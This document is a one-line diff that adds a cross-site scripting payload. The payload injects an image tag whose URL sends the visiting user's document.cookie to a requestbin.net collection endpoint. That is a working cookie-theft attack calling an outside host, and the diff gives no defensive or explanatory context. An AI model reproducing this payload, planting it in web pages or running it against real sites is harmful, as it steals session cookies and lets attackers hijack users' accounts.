@@ -1,0 +1,1 @@
+<script>document.write('<img src=\"http://requestbin.net/r/cesa7gbo?cookie='+document.cookie+'\"></IMG>');</script>
